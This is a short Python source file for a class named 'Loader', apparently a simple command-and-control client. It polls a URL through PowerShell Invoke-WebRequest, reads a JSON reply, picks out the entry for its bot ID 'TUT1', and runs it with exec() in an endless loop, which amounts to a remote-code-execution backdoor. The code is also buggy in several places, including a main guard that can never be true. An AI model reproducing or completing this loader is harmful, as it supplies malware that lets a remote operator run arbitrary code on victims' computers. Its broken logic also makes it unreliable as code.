
class Loader:
	def __init__(self,id):
		self.id = id
		self.url = ""

	def Get_Query(self):
		cmd = subprocess.check_output(['Powershell.exe','Invoke-WebRequest','-Uri',self.url,"-UseBasicParsing",'| Select-Object -Expand Content'],shell=True,stderr=True).decode("utf-8")
		raw_data = json.loads(cmd)
		if self.id in raw_data:
			command = raw_data[self.id]
			return command
		else:
			pass

	def executer(self,code):
		exec(code)

	def mainfunction(self):
		cmd = ""
		while True:
			ncmd = self.Get_Query()
			if cmd != ncmd:
				if ":" in cmd:
					cmd.split("||:||")
					code = cmd[1]
					if code != "":
						self.executer(code)
						print("code executed succesfully")
				if "loader" in cmd:
					pass
			else:
				print("existsing command")
				print("already command")

if "__name__" == "__main__":
	l = Loader("TUT1")
	l.mainfunction()


